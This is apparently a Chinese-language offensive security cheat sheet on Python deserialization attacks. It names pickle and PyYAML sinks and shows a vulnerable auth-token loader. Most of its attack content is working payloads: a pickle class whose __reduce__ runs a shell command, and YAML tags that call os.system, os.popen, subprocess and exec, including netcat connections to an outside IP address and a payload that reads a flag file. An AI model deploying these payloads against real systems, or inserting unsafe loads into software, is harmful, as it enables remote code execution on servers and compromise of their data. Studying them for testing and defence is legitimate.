# Python 反序列化

> Python 反序列化是将序列化的数据重新构造为 Python 对象的过程，通常使用 JSON、pickle 或 YAML 等格式完成。在 Python 中，pickle 模块是一个常用的工具，因为它可以序列化和反序列化复杂的 Python 对象，包括自定义类。

## 概要

* [工具](#工具)
* [方法论](#方法论)
    * [Pickle](#pickle)
    * [PyYAML](#pyyaml)
* [参考](#参考)

## 工具

* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - 用于攻击 Python 驱动应用程序的反序列化 RCE 攻击的有效载荷生成器，支持 pickle、PyYAML、ruamel.yaml 或 jsonpickle 模块。

## 方法论

在 Python 源代码中，查找以下漏洞点：

* `cPickle.loads`
* `pickle.loads`
* `_pickle.loads`
* `jsonpickle.decode`

### Pickle

以下代码是一个简单的示例，展示如何使用 `cPickle` 来生成一个 `auth_token`，它是序列化的 `User` 对象。
:warning: `import cPickle` 仅适用于 Python 2

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

当从用户输入加载令牌时，就会引入漏洞。

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

Python 2.7 文档明确指出，切勿使用 Pickle 处理不受信任的数据源。下面创建一个恶意数据，它将在服务器上执行任意代码。

> pickle 模块对错误或恶意构造的数据不安全。永远不要从不受信任或未经身份验证的来源 unpickle 数据。

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

### PyYAML

YAML 反序列化是将 YAML 格式的数据转换回像 Python、Ruby 或 Java 这样的编程语言中的对象的过程。YAML（YAML Ain't Markup Language）因其人类可读性和支持复杂数据结构而广泛用于配置文件和数据序列化。

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

从 PyYAML 版本 6.0 开始，默认情况下 `load` 的加载器已切换到 SafeLoader，从而缓解了针对远程代码执行的风险。[PR #420 - 修复](https://github.com/yaml/pyyaml/issues/420)

现在易受攻击的漏洞点是 `yaml.unsafe_load` 和 `yaml.load(input, Loader=yaml.UnsafeLoader)`。

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```

## 参考

* [CVE-2019-20477 - 0Day YAML 反序列化攻击（PyYAML 版本 <= 5.1.2）- Manmeet Singh (@_j0lt) - 2020 年 6 月 21 日](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
* [利用 Python 的 "pickle" 滥用 - Nelson Elhage - 2011 年 3 月 20 日](https://blog.nelhage.com/2011/03/exploiting-pickle/)
* [Python YAML 反序列化 - HackTricks - 2024 年 7 月 19 日](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
* [PyYAML 文档 - PyYAML - 2006 年 4 月 29 日](https://pyyaml.org/wiki/PyYAMLDocumentation)
* [Python 中的 YAML 反序列化攻击 - Manmeet Singh & Ashish Kukret - 2021 年 11 月 13 日](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)